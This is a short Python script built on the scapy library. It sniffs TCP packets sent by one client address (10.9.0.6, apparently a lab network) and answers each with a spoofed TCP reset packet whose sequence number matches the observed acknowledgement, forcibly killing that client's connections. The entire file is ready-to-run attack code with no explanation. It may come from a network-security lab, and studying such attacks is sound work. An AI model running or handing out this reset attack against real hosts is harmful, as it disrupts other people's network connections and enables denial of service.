#!/bin/python3
from scapy.all import *
import sys

strClientIP = "10.9.0.6"

def spoof_tcp(pkt):

    lyrIP = IP(dst=strClientIP, src = pkt[IP].dst)
    lyrTCP = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    
    # Build the spoofed packet
    pktSpoofedPacket = lyrIP / lyrTCP
    
    # Send the spoofed packet
    send(pktSpoofedPacket, verbose=0)

pkt = sniff(filter='tcp and src host {}'.format(strClientIP),
            prn=spoof_tcp)